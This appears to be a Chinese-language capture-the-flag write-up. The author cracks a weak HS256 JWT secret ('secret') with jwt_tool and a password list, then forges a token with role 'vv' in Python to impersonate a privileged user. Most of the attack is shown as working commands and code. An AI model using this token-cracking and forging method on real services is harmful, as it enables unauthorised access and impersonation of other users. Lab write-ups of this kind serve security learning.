只有vv能抽到flag，那么就要想办法让服务器认为我是vv咯，想想服务器是如何获取我们身份的，一般会看看我们的cookie

```
cookie:

jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.f6LlphhWFq9tWAIIapPp5992MPDPoybDUYV4HRcpWsU
```

提示的很明显是一串jwt，那么搜搜jwt是什么，搜完你就能发现，现在我是guest，如果role变成vv那应该是能抽出来了，但是jwt最后一串签名让我们不好更改前面的内容，如果只改了前面不改后面，服务器发现签名解密后与前面的不符合就会抛出错误，那么我们需要爆破密钥来更改后面的签名，利用jwt_tools爆破就行

```shell
weiwei@vv-laptop /m/d/C/W/jwt_tool (master) [1]> python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3V
lc3QifQ.f6LlphhWFq9tWAIIapPp5992MPDPoybDUYV4HRcpWsU -C -d password.txt

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

[+] secret is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret"
```

```python
import jwt
# 定义头部（Header）
header = {
    "alg": "HS256",
    "typ": "JWT"
}
# 定义负载（Payload）
payload = {
    "role": "vv"
}
# 密钥（Key）
secret_key = "secret"
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
print(token)
#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidnYifQ.JNGUsBcqTN5sBHETncoddUCd2ZdiQkyLF8qJ_yUYRNE
```

改一下cookie，再抽一发就能抽出啦